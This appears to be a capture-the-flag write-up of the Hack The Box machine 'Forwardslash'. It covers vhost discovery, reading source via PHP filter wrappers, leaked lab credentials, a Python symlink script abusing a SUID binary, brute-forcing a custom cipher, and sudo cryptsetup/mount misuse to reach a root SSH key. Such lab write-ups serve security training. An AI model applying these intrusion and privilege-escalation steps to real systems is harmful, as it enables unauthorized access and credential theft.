---
title: "HackTheBox - Forwardslash"
date: 2020-06-27 07:03:36 +0530
tags: [heap, binary exploitation, linux]
categories: boxes
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true
excerpt: "Write-up of the box Forwardslash from Hack The Box"
---

Fowardslash was a nice hard box where we had to find a hidden backup domain to gain remote access on the machine. The root part included bruteforcing a cipher, which revealed the key to mount an encrypted partition that contained a root ssh private key. 

# NMAP scans

![b7301415-1c0d-48ed-935f-33a38696cb52.png](https://files.nuclino.com/files/bd99b3a0-788e-43b2-94f8-52b42aefaf4b/b7301415-1c0d-48ed-935f-33a38696cb52.png)

* Only port 80 open, must be interesting

# Basic enumeration

The default page of the index.php:

![616af91c-4c09-4d56-9c3c-54acd44cbf77.png](https://files.nuclino.com/files/9312fb05-e8ed-42ed-86e1-6af3b67392fe/616af91c-4c09-4d56-9c3c-54acd44cbf77.png)

Get get some hints that we might need to do an XXE or exploit an FTP server. 

Continuing to fuzz, we get `/note.txt`

![b7b80b02-6e84-480c-b27e-7d4f6c0921f1.png](https://files.nuclino.com/files/b4fcbd39-60dc-4e41-8f30-a89b628ca32d/b7b80b02-6e84-480c-b27e-7d4f6c0921f1.png)

* Probably the first user on the machine: chiv

Using the backup hint, we add **backup.forwardslash.htb** to the `/etc/hosts` to get that page or by bruteforcing possible VHOST names:

![b092ef37-508b-4815-8376-d7b4cf6bfcad.png](https://files.nuclino.com/files/c61716b3-9097-4202-9feb-a4768a7cf566/b092ef37-508b-4815-8376-d7b4cf6bfcad.png)

We can either create a user or an already existing user `pain:password` 

Bruteforcing the dirs we get the following pages:

```shell
DirBuster 1.0-RC1 - Report
Report produced on Mon Apr 06 17:37:08 CEST 2020
--------------------------------
http://backup.forwardslash.htb:80
--------------------------------
Dirs found with a 403 response:
/icons/
/dev/
/icons/small/
/server-status/
--------------------------------
Files found with a 302 responce:
/index.php
/welcome.php
/environment.php
/logout.php
/hof.php
--------------------------------
Files found with a 200 responce:
/login.php
/register.php
/api.php
/config.php
--------------------------------
Files found with a 403 responce:
/dev/index.php
```

Continuing to enumerate, I also found the profilepicture.php, which allows us to include an URL to change our profile picture.

![8c56bb66-16d0-49c4-86fe-b0966e6b700c.png](https://files.nuclino.com/files/c61ccb92-2a51-4bd5-be06-911a9bbf2355/8c56bb66-16d0-49c4-86fe-b0966e6b700c.png)

Since it is only HTML disabled, we can go ahead and enable it using the inspector HTML inspector in the browser to then intercept the request. Here we can see what it looks like. It looks like the author of the box thought of this exploit, so we get a sneaky little message that it won't work this way:

![c4721c46-0423-49c7-9093-33c931ce1847.png](https://files.nuclino.com/files/ba84a697-128a-4ca5-b251-47e44a6746ae/c4721c46-0423-49c7-9093-33c931ce1847.png)

At first I thought that we had to do some kind of XXE, as mentioned before, but it is way simpler to use PHP wrappers/filters to read the file. The [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) repo has a great collection:

![638ffa93-d481-4d83-ad8a-3d484f7a0922.png](https://files.nuclino.com/files/a000439d-eb32-4a24-80f7-defe4fd477c6/638ffa93-d481-4d83-ad8a-3d484f7a0922.png)

This way we can read the source code of api.php, where we can find some creds:

![4b235659-62ff-47b4-9e2e-10f8d1e61761.png](https://files.nuclino.com/files/a232553f-980d-4fc6-9fc8-a968455d2782/4b235659-62ff-47b4-9e2e-10f8d1e61761.png)

`Chiv:N0bodyL1kesBack`/

# Getting user: pain

SSH into the system and after some enumeration a binary has been found. It is called backup and can be executed by us and has the SUID bit set, therefore allowing us to execute it as the owner - pain.

Here's what it does:

* It creates an MD5 Hash depending on the time
* The binary checks if a file has the same name as a hash at the created-time
* If correct, the contents of a file will be printed
* Creating a little python script, which looks like this, we can read the contents of `/var/backups/config.php.bak`, which contains the creds of the user pain

Using this little python script to read the contents:

```python
from datetime import datetime
import hashlib
import os
now = datetime.now()
current_time = now.strftime("%H:%M:%S")
hash = (hashlib.md5(current_time.encode()).hexdigest())
print(hash)
os.symlink("/var/backups/config.php.bak", hash)
os.system("/usr/bin/backup")
```

It must be executed in the home dir of chiv

Creds of pain:

`pain:db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704`

# Getting root

Now we can SSH as pain and find a the **encryptinator **that was made by our friend chiv:

Source code:

```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

As well as a Ciphertext:

```
,L
>2Xբ
|?I)E-˒\/;y[w#M2ʐY@'缘泣,P@5f$\*rwF3gX}i6~KY'%e>xo+g/K>^Nke
```

I tried to understand the cipher and how it works out, but in the end i was curios if it was bruteforceable and voilà it worked:

```
def decrypt(key, msg):
    file = open("/usr/share/wordlists/rockyou.txt")    
    for line in file:
        line = list(line)
        with io.open('ciphertext', 'rb') as f:
            msg = f.read()
            msg = list(msg)
            for i in range(len(msg)):
                msg[i] = chr(msg[i])
            for char_key in reversed(line):
                for i in reversed(range(len(msg))):
                    msg[i] = chr((ord(msg[i]) - (ord(char_key)+ord(msg[i-1])))%256)
        print(''.join(msg) + '\n')

decrypt("REDACTED", "asd")
```

Executing it gives the following password:

`python3 file.py | strings -n 25`

The found key was: `thismypassword`

Now we can decrypt the cipher to receive some strange password:

`cB!6%sdH8Lj^@Y\*$C2cf`

Now that we did that, we remember that there was a file in `/var/backups/recovery`, a LUKS encrypted file that contains something that we want. 

![52f919a6-7a02-44b0-b9c1-a20eeaec1c9a.png](https://files.nuclino.com/files/e12a8779-f0d0-4724-8ba3-0e35633f3932/52f919a6-7a02-44b0-b9c1-a20eeaec1c9a.png)

Checking the SUDO permissions, we can do the following:

```
User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

Now that means that we can move to `/dev/mapper/` and create a backup file using the image:

```
cd /dev/mapper/
sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
mkdir /tmp/mnt
cd /tmp
sudo /bin/mount /dev/mapper/backup ./mnt/
```

When looking into our mount file, we can now see that we have a private key - the only user that is left is root, so we know have successfully rooted the forwardslash!

root-private key:

[id_rsa](https://files.nuclino.com/files/4a493eb9-86e7-4891-9399-2e41ab32432f/id_rsa)
